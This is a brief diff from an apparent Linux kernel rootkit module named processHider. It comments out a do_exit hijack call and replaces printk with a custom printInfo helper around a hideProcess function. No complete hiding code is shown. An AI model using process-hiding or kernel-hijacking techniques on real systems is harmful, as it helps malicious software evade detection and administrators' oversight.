@@ -2,8 +2,9 @@
 #include <linux/sched.h> // for task_struct
 #include <linux/rculist.h>
 
+#include "messagesToUser.h"
 #include "processHider.h"
-#include "doExitHijack.h"
+//#include "doExitHijack.h"
 
 
 // prototypes for functions from pid.c
@@ -23,7 +24,7 @@ int processHider_init(void) {
 	//hideProcess(pid); // todo: perhaps use result of function call..
 	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues
 
-	replacement_do_exit(0);
+	//replacement_do_exit(0);
 	return 0;
 }
 
@@ -52,7 +53,7 @@ static int hideProcess(int pidNumber) {
 	
 	//todo release lock..
 	
-	printk(KERN_INFO "pid points to %p\n", pid); // TODO: print time etc..
+	printInfo("pid points to %p\n", pid); // TODO: print time etc..
 	
 	return 0;
 }
